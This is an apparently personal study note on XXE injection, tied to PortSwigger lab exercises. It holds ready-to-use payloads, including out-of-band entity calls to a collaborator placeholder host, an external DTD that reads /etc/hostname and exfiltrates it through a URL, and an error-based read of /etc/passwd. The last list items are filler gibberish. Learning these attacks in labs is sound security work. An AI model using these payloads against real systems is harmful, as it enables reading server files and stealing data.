# Referrence
- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection  

## XML Basics  
- Document Type Definition (DTD)  
- XML Custom and External Entities  
`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`  
- Parameter Entities  
 `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`  
 `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`  

## Type of XXE attacks  
- Retrieve files
- SSRF attacks  
- Exfiltrate data out-of-band  
- Retrieve data via error messages

## Basic entity
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

### Labs PortSwigger
1. Blind XXE with out-of-band interaction  
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
```
2. Blind XXE with out-of-band interaction via XML parameter entities  
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```  
3. Exploiting blind XXE to exfiltrate data using a malicious external DTD  
>Set payload DTD file in exploit server
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```
>Check /product/stock page and paste the next XXE payload:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
4. Exploiting blind XXE to retrieve data via error messages  
>Set payload DTD file in exploit server
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
>Check /product/stock page and paste the next XXE payload:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
5. afsdag
6. gafga
7. gafgsg
8. 
